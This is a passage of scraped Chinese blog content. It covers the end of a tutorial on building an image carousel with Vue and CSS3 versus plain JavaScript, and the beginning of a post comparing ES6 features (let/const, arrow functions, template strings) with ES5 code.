height: 500px;\n            overflow: hidden;\n            position: relative;\n            margin: 20px auto;\n        }\n\n        ul {\n            transition: all .5s ease;\n        }\n\n        li {\n            <span class=\"hljs-built_in\">float</span>: left;\n        }\n\n        .slide-arrow div {\n            width: 50px;\n            height: 100px;\n            position: absolute;\n            margin: auto;\n            top: 0;\n            bottom: 0;\n            background: url(<span class=\"hljs-string\">\"http://i1.bvimg.com/1949/4d860a3067fab23b.jpg\"</span>) no-repeat;\n        }\n\n        .arrow-right {\n            transform: rotate(180deg);\n            right: 0;\n        }\n\n        .arrow-left {\n            left: 0;\n        }\n        .slide-option{\n            position: absolute;\n            bottom: 10px;\n            width: 100%;\n            left: 0;\n            text-align: center;\n        }\n        .slide-option span{\n            display: inline-block;\n            width: 14px;\n            height: 14px;\n            border-radius: 100%;\n            background: <span class=\"hljs-comment\">#ccc;</span>\n            margin: 0 10px;\n        }\n        .slide-option .active{\n            background: <span class=\"hljs-comment\">#09f;</span>\n        }\n    &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div class=<span class=\"hljs-string\">\"slide-img clear\"</span> id=<span class=\"hljs-string\">\"slide-img\"</span>&gt;\n    &lt;!--用tran这个class控制ul是否含有过渡效果，样式已经写好--&gt;\n    &lt;ul :style=<span class=\"hljs-string\">\"{'width':(listWidth*list.length)+'px','transform':'translate3d(-'+(listWidth*nowIndex)+'px,0,0)'}\"</span>&gt;\n        &lt;!--遍历出来的图片--&gt;\n        &lt;li v-for=<span class=\"hljs-string\">\"(li,index) in list\"</span> :style=<span class=\"hljs-string\">\"{'width':listWidth+'px'}\"</span>&gt;\n            &lt;a href=<span class=\"hljs-string\">\"javascript:;\"</span>&gt;\n                &lt;img :src=<span class=\"hljs-string\">\"li\"</span> class=<span class=\"hljs-string\">\"slider-img\"</span>/&gt;\n            &lt;/a&gt;\n        &lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;div class=<span class=\"hljs-string\">\"slide-option\"</span>&gt;\n        &lt;span v-for=<span class=\"hljs-string\">\"(li,index) in list\"</span> :class=<span class=\"hljs-string\">\"{'active':index===nowIndex}\"</span>&gt;&lt;/span&gt;\n    &lt;/div&gt;\n    &lt;div class=<span class=\"hljs-string\">\"slide-arrow\"</span>&gt;\n        &lt;div class=<span class=\"hljs-string\">\"arrow-left\"</span> @click.stop=<span class=\"hljs-string\">\"switchDo('reduce')\"</span>&gt;&lt;/div&gt;\n        &lt;div class=<span class=\"hljs-string\">\"arrow-right\"</span> @click.stop=<span class=\"hljs-string\">\"switchDo\"</span>&gt;&lt;/div&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;script src=<span class=\"hljs-string\">\"vue.min.js\"</span>&gt;&lt;/script&gt;\n&lt;script <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text/javascript\"</span>&gt;\n    new Vue({\n        el: <span class=\"hljs-string\">'#slide-img'</span>,\n        data: {\n            nowIndex: 0,\n            listWidth: <span class=\"hljs-string\">'1000'</span>,\n            list: [<span class=\"hljs-string\">'./images/timg1.jpg'</span>, <span class=\"hljs-string\">'./images/timg2.jpg'</span>, <span class=\"hljs-string\">'./images/timg3.jpg'</span>, <span class=\"hljs-string\">'./images/timg4.jpg'</span>],\n            timer:null\n        },\n        methods: {\n            //滑动操作\n            switchDo(reduce){\n                clearInterval(this.timer);\n                //根据reduce判断this.nowIndex的增加或者减少！\n                <span class=\"hljs-keyword\">if</span>(reduce===<span class=\"hljs-string\">'reduce'</span>){\n                    //如果是第一张，就返回最后一张\n                    <span class=\"hljs-keyword\">if</span>(this.nowIndex===0){\n                        this.nowIndex=this.list.length-1;\n                    }\n                    <span class=\"hljs-keyword\">else</span>{\n                        this.nowIndex--;\n                    }\n                }\n                <span class=\"hljs-keyword\">else</span>{\n                    //如果是最后一张，就返回第一张\n                    <span class=\"hljs-keyword\">if</span>(this.nowIndex===this.list.length-1){\n                        this.nowIndex=0;\n                    }\n                    <span class=\"hljs-keyword\">else</span>{\n                        this.nowIndex++;\n                    }\n                }\n                var _this=this;\n                this.timer=<span class=\"hljs-built_in\">set</span>Interval(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n                    _this.switchDo();\n                },4000)\n\n            },\n        },\n        <span class=\"hljs-function\"><span class=\"hljs-title\">mounted</span></span>(){\n            var _this=this;\n            this.timer=<span class=\"hljs-built_in\">set</span>Interval(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n                _this.switchDo();\n            },4000)\n        }\n    })\n&lt;/script&gt;\n&lt;/html&gt;</code></pre><h3 data-id=\"heading-15\">javascript方式</h3><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\n&lt;head&gt;\n    &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n    &lt;link rel=<span class=\"hljs-string\">\"stylesheet\"</span> href=<span class=\"hljs-string\">\"reset.css\"</span>&gt;\n    &lt;style&gt;\n        .slide-img {\n            width: 1000px;\n            height: 500px;\n            overflow: hidden;\n            position: relative;\n            margin: 20px auto;\n        }\n\n        ul {\n            transition: all .5s ease;\n        }\n\n        li {\n            <span class=\"hljs-built_in\">float</span>: left;\n        }\n\n        .slide-arrow div {\n            width: 50px;\n            height: 100px;\n            position: absolute;\n            margin: auto;\n            top: 0;\n            bottom: 0;\n            background: url(<span class=\"hljs-string\">\"http://i1.bvimg.com/1949/4d860a3067fab23b.jpg\"</span>) no-repeat;\n        }\n\n        .arrow-right {\n            transform: rotate(180deg);\n            right: 0;\n        }\n\n        .arrow-left {\n            left: 0;\n        }\n        .slide-option{\n            position: absolute;\n            bottom: 10px;\n            width: 100%;\n            left: 0;\n            text-align: center;\n        }\n        .slide-option span{\n            display: inline-block;\n            width: 14px;\n            height: 14px;\n            border-radius: 100%;\n            background: <span class=\"hljs-comment\">#ccc;</span>\n            margin: 0 10px;\n        }\n        .slide-option .active{\n            background: <span class=\"hljs-comment\">#09f;</span>\n        }\n    &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div class=<span class=\"hljs-string\">\"slide-img clear\"</span> id=<span class=\"hljs-string\">\"slide-img\"</span>&gt;\n    &lt;!--用tran这个class控制ul是否含有过渡效果，样式已经写好--&gt;\n    &lt;ul id=<span class=\"hljs-string\">\"slide-img-ul\"</span>&gt;\n        &lt;!--遍历出来的图片--&gt;\n        &lt;li style=<span class=\"hljs-string\">\"width: 1000px;\"</span>&gt;&lt;a href=<span class=\"hljs-string\">\"javascript:;\"</span>&gt;&lt;img src=<span class=\"hljs-string\">\"images/timg1.jpg\"</span> class=<span class=\"hljs-string\">\"slider-img\"</span>/&gt;&lt;/a&gt;&lt;/li&gt;\n        &lt;li style=<span class=\"hljs-string\">\"width: 1000px;\"</span>&gt;&lt;a href=<span class=\"hljs-string\">\"javascript:;\"</span>&gt;&lt;img src=<span class=\"hljs-string\">\"images/timg2.jpg\"</span> class=<span class=\"hljs-string\">\"slider-img\"</span>/&gt;&lt;/a&gt;&lt;/li&gt;\n        &lt;li style=<span class=\"hljs-string\">\"width: 1000px;\"</span>&gt;&lt;a href=<span class=\"hljs-string\">\"javascript:;\"</span>&gt;&lt;img src=<span class=\"hljs-string\">\"images/timg3.jpg\"</span> class=<span class=\"hljs-string\">\"slider-img\"</span>/&gt;&lt;/a&gt;&lt;/li&gt;\n        &lt;li style=<span class=\"hljs-string\">\"width: 1000px;\"</span>&gt;&lt;a href=<span class=\"hljs-string\">\"javascript:;\"</span>&gt;&lt;img src=<span class=\"hljs-string\">\"images/timg4.jpg\"</span> class=<span class=\"hljs-string\">\"slider-img\"</span>/&gt;&lt;/a&gt;&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;div class=<span class=\"hljs-string\">\"slide-option\"</span>&gt;\n        &lt;span&gt;&lt;/span&gt;\n        &lt;span&gt;&lt;/span&gt;\n        &lt;span&gt;&lt;/span&gt;\n        &lt;span&gt;&lt;/span&gt;\n    &lt;/div&gt;\n    &lt;div class=<span class=\"hljs-string\">\"slide-arrow\"</span>&gt;\n        &lt;div class=<span class=\"hljs-string\">\"arrow-left\"</span>&gt;&lt;/div&gt;\n        &lt;div class=<span class=\"hljs-string\">\"arrow-right\"</span>&gt;&lt;/div&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;script <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text/javascript\"</span>&gt;\n    window.onload=<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        var oUl=document.querySelector(<span class=\"hljs-string\">'#slide-img-ul'</span>);\n        var oLi=oUl.querySelectorAll(<span class=\"hljs-string\">'li'</span>);\n        var oSpan=document.querySelector(<span class=\"hljs-string\">'.slide-option'</span>).querySelectorAll(<span class=\"hljs-string\">'span'</span>);\n        var oArrowLeft=document.querySelector(<span class=\"hljs-string\">'.arrow-left'</span>);\n        var oArrowRight=document.querySelector(<span class=\"hljs-string\">'.arrow-right'</span>);\n        oUl.style.width=<span class=\"hljs-string\">'4000px'</span>;\n        oArrowLeft.addEventListener(<span class=\"hljs-string\">'click'</span>,<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n            switchDo(<span class=\"hljs-string\">'reduce'</span>);\n        })\n        oArrowRight.addEventListener(<span class=\"hljs-string\">'click'</span>,<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n            switchDo();\n        })\n        var timer=null,nowIndex=0;\n        <span class=\"hljs-keyword\">function</span> switchDo(reduce){\n            clearInterval(timer);\n            //设置样式\n            oUl.style.transform=<span class=\"hljs-string\">'translate3d(-'</span>+(1000*nowIndex)+<span class=\"hljs-string\">'px,0,0)'</span>;\n            <span class=\"hljs-keyword\">for</span> (var i=0;i&lt;oSpan.length;i++){\n                <span class=\"hljs-keyword\">if</span>(i===nowIndex){\n                    oSpan[i].className=<span class=\"hljs-string\">'active'</span>;\n                }\n                <span class=\"hljs-keyword\">else</span>{\n                    oSpan[i].className=<span class=\"hljs-string\">''</span>;\n                }\n            }\n            //根据reduce判断this.nowIndex的增加或者减少！\n            <span class=\"hljs-keyword\">if</span>(reduce===<span class=\"hljs-string\">'reduce'</span>){\n                //如果是第一张，就返回最后一张\n                <span class=\"hljs-keyword\">if</span>(nowIndex===0){\n                    nowIndex=oLi.length-1;\n                }\n                <span class=\"hljs-keyword\">else</span>{\n                    nowIndex--;\n                }\n            }\n            <span class=\"hljs-keyword\">else</span>{\n                //如果是最后一张，就返回第一张\n                <span class=\"hljs-keyword\">if</span>(nowIndex===oLi.length-1){\n                    nowIndex=0;\n                }\n                <span class=\"hljs-keyword\">else</span>{\n                    nowIndex++;\n                }\n            }\n            timer=<span class=\"hljs-built_in\">set</span>Interval(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n                switchDo();\n            },4000)\n        }\n        switchDo();\n    }\n&lt;/script&gt;\n&lt;/html&gt;</code></pre><h2 data-id=\"heading-16\">5.小结</h2><p>好了，关于<code>vue</code>+<code>css3</code>开发的特效，以及和<code>javascript</code>+<code>css3</code>的对比，就说到这里了，希望这三个小实例，能帮到大家了解下应该怎么使用<code>vue</code>+<code>css3</code>开发特效的。今天讲这三个小实例不是说给大家代码，让大家复制粘贴使用，而是希望能起到一个抛砖引玉的作用，拓展思维的作用！就像我之前写文章说得那样，我写文章是希望能起到一个授人以渔的作用，而不是授人以鱼！最后，如果大家觉得有什么地方我写错了，写错不好，或者有其它什么建议，欢迎指出！让大家相互学习，共同进步！</p><p><br></p><p>-------------------------华丽的分割线--------------------<br>想了解更多，关注关注我的微信公众号：守候书阁</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d33b27d3f303a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"258\" data-height=\"258\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;258&quot; height=&quot;258&quot;&gt;&lt;/svg&gt;\"></p><p><br></p></div>"},null,{"title":"实例感受-es6的常用语法和优越性","avatar":"https://user-gold-cdn.xitu.io/2017/7/18/64d82b70650d11ed806f611d929c7b1e?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"守候i","create_time":"2017 年 11 月 13 日","tags":["JavaScript","ECMAScript 6"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 data-id=\"heading-0\">1.前言</h2><p>前几天，用es6的语法重写了我的一个代码库，说是重写，其实改动的并不多，工作量不大。在重写完了的时候，就个人总结了一下es6常用的一些常用的语法和比es5优越的方面。下面提到的语法可能也就是es6新特性的10%-20%，但是开发上占了80%左右的。下面的文章，按照es6常用新特性进行分类，文章提及的实例，有些是我代码库的小实例，有些是自己随便编的，大家知道就好！希望可以帮到大家，如果大家觉得文章有什么地方写错了，或者哪里写得不对，欢迎指出！</p><blockquote><p>1.可能还有些人不知道我说的的代码库是什么，简单的打下广告：这个代码库是我封装了一些javascript常用的小实例，比如：<b>数组去重</b>，<b>字符替换</b>，<b>常用Dom操作</b>，<b>图片懒加载</b>等的57个小实例（<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FchenhuiYj%2Fec-do\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">查看说明</a>）。代码也上传到github上面了！es5版本--<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FchenhuiYj%2Fec-do%2Fblob%2Fmaster%2Fsrc%2Fec-do-1.1.4.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ec-do-1.1.4</a>。es6版本--<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FchenhuiYj%2Fec-do%2Fblob%2Fmaster%2Fsrc%2Fec-do-2.0.0.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ec-do-2.0.0</a>。欢迎大家star。也希望大家可以多给意见，或者和大家一起完善这个项目！<br>2.至于这个代码库的使用方法，去github看一下就知道了，这里不多说！<br>3.es6发布两年多了，现在都发布了es7，es8了，但是es7和es8更新的东西不多，可以参考下面两个链接！<a href=\"https://link.juejin.im?target=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000011017894\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">聊聊ES7与ES8特性</a>，<a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.cnblogs.com%2Fzhuanzhuanfe%2Fp%2F7493433.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">10分钟学会ES7+ES8</a>。</p></blockquote><h2 data-id=\"heading-1\">2.let const</h2><p><code>let</code>和<code>var</code>区别在于，<code>let</code>有块级作用域的的区分概念。</p><p>如下实例</p><pre class=\"hljs bash\"><code>//相当于声明了一个全局的i变量。\n<span class=\"hljs-keyword\">for</span>(var i=0;i&lt;10;i++){\n    console.log(i)\n}\nconsole.log(<span class=\"hljs-string\">'最后的值：'</span>+i)   \n </code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/13/f5175cf0920110ada9d0bc06c96bee3e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"412\" data-height=\"203\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;412&quot; height=&quot;203&quot;&gt;&lt;/svg&gt;\"></p><pre class=\"hljs bash\"><code>//j只在这个<span class=\"hljs-keyword\">for</span>循环有效，如果在循环外调用就会报错\n<span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">let</span> j=0;j&lt;10;j++){\n    console.log(j)\n}\nconsole.log(<span class=\"hljs-string\">'最后的值：'</span>+j)</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/13/e5764bb6702ebbcc56ac9037da4d930e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"482\" data-height=\"221\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;482&quot; height=&quot;221&quot;&gt;&lt;/svg&gt;\"></p><p>还有一个常见的使用场景是：比如一个页面有5个<code>li</code>，索引当然就是0,1,2,3,4。点击某一个li，显示该li的索引。</p><pre class=\"hljs bash\"><code>var oLi= document.querySelectorAll(<span class=\"hljs-string\">'li'</span>)\n<span class=\"hljs-keyword\">for</span> (var i = 0,len = oLi.length; i &lt; len; i++){\n    oLi[i].onclick = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>(){\n        console.log(i)\n    }\n}\n</code></pre><p>这样写，其实无论点击那个<code>li</code>，都是显示5。因为当点击<code>li</code>的时候，上面的代码已经执行完了，那么每个<code>i</code>，就是等于5，就显示5。</p><p>用let就不会出现这个问题</p><pre class=\"hljs bash\"><code>var oLi= document.querySelectorAll(<span class=\"hljs-string\">'li'</span>)\n<span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> i = 0,len = oLi.length; i &lt; len; i++){\n    oLi[i].onclick = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>(){\n        console.log(i)\n    }\n}\n</code></pre><p>用了let，如果点击第一个<code>li</code>，就显示0，点击第三个<code>li</code>，就显示2。这个大家可以自行尝试下！</p><p>说完了<code>let</code>，说下<code>const</code>，<code>const</code>初始化赋值之后就不能再改变赋值。如下图。</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/13/f15b346198f7d737e5bb8634c4ce6357?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"518\" data-height=\"103\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;518&quot; height=&quot;103&quot;&gt;&lt;/svg&gt;\"></p><p>这个我目前是用在引用插件，库，或者模块化开发上！</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/13/0e7aea9940e0e11992ddd36b79616d96?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"486\" data-height=\"50\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;486&quot; height=&quot;50&quot;&gt;&lt;/svg&gt;\"></p><p>比如上面这个，在开发上可以由于重名而带来的异常！</p><h2 data-id=\"heading-2\">3.arrow function</h2><p>箭头函数，使用的频率非常的高！写法也是非常的简洁和清晰！</p><p>如下的数组求和实例</p><pre class=\"hljs bash\"><code>//sumArr都是ecDo在这个对象里面的属性，但是大家看到es6和es5的定义方式不一样，是es6简写方式。\n//es6写法-隐式返回\nsumArr(arr) {\n    <span class=\"hljs-built_in\">return</span> arr.reduce((pre, cur) =&gt;pre + cur)\n}\n//es6写法-显式返回\nsumArr(arr) {\n    <span class=\"hljs-built_in\">return</span> arr.reduce((pre, cur) =&gt;{<span class=\"hljs-built_in\">return</span> pre + cur})\n}\n//es5写法\nsumArr: <span class=\"hljs-keyword\">function</span> (arr) {\n    <span class=\"hljs-built_in\">return</span> arr.reduce(<span class=\"hljs-keyword\">function</span> (pre, cur) {\n        <span class=\"hljs-built_in\">return</span> pre + cur\n    })\n},\n</code></pre><p>还有一个常用的场景是，当使用了<code>setTimeout</code>或者<code>setInterval</code>的时候。如下‘图片懒加载的实例’（代码暂时可以不用看得太细，看图片就好，贴代码是为了让大家看到整个函数，不让大家蒙）。过程不详细说，看<code>es6</code>和<code>es5</code>的使用区别！</p><pre class=\"hljs bash\"><code>//es6写法，（如果看到函数参数有不懂的不用急，后面会提到！）\nloadImg(className = <span class=\"hljs-string\">'ec-load-img'</span>, num = 0, errorUrl = null) {\n    <span class=\"hljs-built_in\">let</span> oImgLoad = document.getElementsByClassName(className);\n    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> i = 0, len = oImgLoad.length; i &lt; len; i++) {\n        //如果图片已经滚动到指定的高度\n        <span class=\"hljs-keyword\">if</span> (document.documentElement.clientHeight + document.documentElement.scrollTop &gt; oImgLoad[i].offsetTop - num &amp;&amp; !oImgLoad[i].isLoad) {\n            //记录图片是否已经加载\n            oImgLoad[i].isLoad = <span class=\"hljs-literal\">true</span>;\n            //设置过渡，当图片下来的时候有一个图片透明度变化\n            oImgLoad[i].style.cssText = <span class=\"hljs-string\">\"transition: ''; opacity: 0;\"</span>;\n            <span class=\"hljs-keyword\">if</span> (oImgLoad[i].dataset) {\n                this.aftLoadImg(oImgLoad[i], oImgLoad[i].dataset.src, errorUrl, <span class=\"hljs-keyword\">function</span> (o) {\n                    //添加定时器，确保图片已经加载完了，再把图片指定的的class，清掉，避免重复编辑\n                    <span class=\"hljs-built_in\">set</span>Timeout(()=&gt;{\n                        <span class=\"hljs-keyword\">if</span> (o.isLoad) {\n                            this.removeClass(o, className);\n                            o.style.cssText = <span class=\"hljs-string\">\"\"</span>;\n                        }\n                    }, 1000)\n                });\n            } <span class=\"hljs-keyword\">else</span> {\n                this.aftLoadImg(oImgLoad[i], oImgLoad[i].getAttribute(<span class=\"hljs-string\">\"data-src\"</span>), errorUrl, <span class=\"hljs-keyword\">function</span> (o) {\n                    //添加定时器，确保图片已经加载完了，再把图片指定的的class，清掉，避免重复编辑\n                    <span class=\"hljs-built_in\">set</span>Timeout(()=&gt;{\n                        <span class=\"hljs-keyword\">if</span> (o.isLoad) {\n                            this.removeClass(o, className);\n                            o.style.cssText = <span class=\"hljs-string\">\"\"</span>;\n                        }\n                    }, 1000)\n                });\n            }\n            (<span class=\"hljs-keyword\">function</span> (i) {\n                <span class=\"hljs-built_in\">set</span>Timeout(()=&gt;{\n                    oImgLoad[i].style.cssText = <span class=\"hljs-string\">\"transition:all 1s; opacity: 1;\"</span>;\n                }, 16)\n            })(i);\n        }\n    }\n}\n\n//es5写法\nloadImg: <span class=\"hljs-keyword\">function</span> (className, num, errorUrl) {\n    var _className = className || <span class=\"hljs-string\">'ec-load-img'</span>, _num = num || 0, _this = this,_errorUrl=errorUrl||null;\n    var oImgLoad = document.getElementsByClassName(_className);\n    <span class=\"hljs-keyword\">for</span> (var i = 0, len = oImgLoad.length; i &lt; len; i++) {\n        //如果图片已经滚动到指定的高度\n        <span class=\"hljs-keyword\">if</span> (document.documentElement.clientHeight + document.documentElement.scrollTop &gt; oImgLoad[i].offsetTop - _num &amp;&amp; !oImgLoad[i].isLoad) {\n            //记录图片是否已经加载\n            oImgLoad[i].isLoad = <span class=\"hljs-literal\">true</span>;\n            //设置过渡，当图片下来的时候有一个图片透明度变化\n            oImgLoad[i].style.cssText = <span class=\"hljs-string\">\"transition: ''; opacity: 0;\"</span>\n            <span class=\"hljs-keyword\">if</span> (oImgLoad[i].dataset) {\n                this.aftLoadImg(oImgLoad[i], oImgLoad[i].dataset.src, _errorUrl, <span class=\"hljs-keyword\">function</span> (o) {\n                    //添加定时器，确保图片已经加载完了，再把图片指定的的class，清掉，避免重复编辑\n                    <span class=\"hljs-built_in\">set</span>Timeout(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n                        <span class=\"hljs-keyword\">if</span> (o.isLoad) {\n                            _this.removeClass(o, _className);\n                            o.style.cssText = <span class=\"hljs-string\">\"\"</span>;\n                        }\n                    }, 1000)\n                });\n            } <span class=\"hljs-keyword\">else</span> {\n                this.aftLoadImg(oImgLoad[i], oImgLoad[i].getAttribute(<span class=\"hljs-string\">\"data-src\"</span>), _errorUrl, <span class=\"hljs-keyword\">function</span> (o) {\n                    //添加定时器，确保图片已经加载完了，再把图片指定的的class，清掉，避免重复编辑\n                    <span class=\"hljs-built_in\">set</span>Timeout(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n                        <span class=\"hljs-keyword\">if</span> (o.isLoad) {\n                            _this.removeClass(o, _className);\n                            o.style.cssText = <span class=\"hljs-string\">\"\"</span>;\n                        }\n                    }, 1000)\n                });\n            }\n            (<span class=\"hljs-keyword\">function</span> (i) {\n                <span class=\"hljs-built_in\">set</span>Timeout(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n                    oImgLoad[i].style.cssText = <span class=\"hljs-string\">\"transition:all 1s; opacity: 1;\"</span>;\n                }, 16)\n            })(i);\n        }\n    }\n}</code></pre><p>代码贴了这么多，其实区别就三小块</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/13/9eb1be0d344bd9cdf65cb1e8c8fc32fd?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"274\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;274&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/13/ea293a85458feb2d7faa89f468aca719?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"310\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;310&quot;&gt;&lt;/svg&gt;\"></p><p>简单解释一下：当使用箭头函数了，函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。（比如上面提到的实例，<code>setTimeout</code>里面的this，原本指向window，但是使用的箭头函数，就指向ecDo这个对象）<br>原因是箭头函数没有this，它的this是继承外面的，因此内部的this就是外层代码块的this。</p><h2 data-id=\"heading-3\">4.template string</h2><p>模板字符串，这个平常使用的频率也非常高，而且也很实用！</p><p>如下实例：到某一个时间的倒计时</p><pre class=\"hljs bash\"><code>//es6写法\ngetEndTime(endTime) {\n    <span class=\"hljs-built_in\">let</span> startDate = new Date(); //开始时间，当前时间\n    <span class=\"hljs-built_in\">let</span> endDate = new Date(endTime); //结束时间，需传入时间参数\n    <span class=\"hljs-built_in\">let</span> t = endDate.getTime() - startDate.getTime(); //时间差的毫秒数\n    <span class=\"hljs-built_in\">let</span> d = 0,\n        h = 0,\n        m = 0,\n        s = 0;\n    <span class=\"hljs-keyword\">if</span> (t &gt;= 0) {\n        d = Math.floor(t / 1000 / 3600 / 24);\n        h = Math.floor(t / 1000 / 60 / 60 % 24);\n        m = Math.floor(t / 1000 / 60 % 60);\n        s = Math.floor(t / 1000 % 60);\n    }\n    <span class=\"hljs-built_in\">return</span> `剩余时间<span class=\"hljs-variable\">${d}</span>天<span class=\"hljs-variable\">${h}</span>小时<span class=\"hljs-variable\">${m}</span>分钟<span class=\"hljs-variable\">${s}</span>秒<span class=\"hljs-string\">\"`;\n}\n//es5写法\ngetEndTime: function (endTime) {\n    var startDate = new Date(); //开始时间，当前时间\n    var endDate = new Date(endTime); //结束时间，需传入时间参数\n    var t = endDate.getTime() - startDate.getTime(); //时间差的毫秒数\n    var d = 0,\n        h = 0,\n        m = 0,\n        s = 0;\n    if (t &gt;= 0) {\n        d = Math.floor(t / 1000 / 3600 / 24);\n        h = Math.floor(t / 1000 / 60 / 60 % 24);\n        m = Math.floor(t / 1000 / 60 % 60);\n        s = Math.floor(t / 1000 % 60);\n    }\n    return \"</span>剩余时间<span class=\"hljs-string\">\" + d + \"</span>天 <span class=\"hljs-string\">\" + h + \"</span>小时 <span class=\"hljs-string\">\" + m + \"</span> 分钟<span class=\"hljs-string\">\" + s + \"</span> 秒<span class=\"hljs-string\">\";\n}\n</span></code></pre><p>可能大家还不觉得模板字符串怎么好用，那么接下来再说一个实例，比如往一个<code>div</code>添加一大段的<code>html</code>内容时。es5的做法是</p><pre class=\"hljs bash\"><code>var obj={\n    author:<span class=\"hljs-string\">'守候'</span>,\n    time:<span class=\"hljs-string\">'2017.11.8'</span>,\n    thing:<span class=\"hljs-string\">'看下模板字符串的方便性。'</span>\n}\n$(<span class=\"hljs-string\">\"#test\"</span>).append(\n  <span class=\"hljs-string\">\"&lt;p&gt;这是&lt;i&gt;\"</span> + obj.author+ <span class=\"hljs-string\">\"&lt;/i&gt; \"</span> +\n      <span class=\"hljs-string\">\"写的一个实例。这个实例是为了\"</span> +\n      <span class=\"hljs-string\">\"&lt;i&gt;\"</span> + obj.thing +\n      <span class=\"hljs-string\">\"&lt;/i&gt;\"</span>+<span class=\"hljs-string\">\"&lt;span&gt;写作日期是：\"</span>+obj.time+\n      <span class=\"hljs-string\">\"&lt;/span&gt;&lt;/p&gt;\"</span>\n);</code></pre><p>而使用es6，就简单多了</p><pre class=\"hljs bash\"><code><span class=\"hljs-built_in\">let</span> obj={\n    author:<span class=\"hljs-string\">'守候'</span>,\n    time:<span class=\"hljs-string\">'2017.11.8'</span>,\n    thing:<span class=\"hljs-string\">'看下模板字符串的方便性。'</span>\n}\n$(<span class=\"hljs-string\">\"#test\"</span>).append(\n  `&lt;p&gt;\n      这是&lt;i&gt;<span class=\"hljs-variable\">${obj.author}</span>&lt;/i&gt;\n      写的一个实例。这个实例是为了\n      &lt;i&gt; <span class=\"hljs-variable\">${obj.thing}</span>&lt;/i&gt;\n      &lt;span&gt;写作日期是：<span class=\"hljs-variable\">${obj.time}</span>&lt;/span&gt;\n   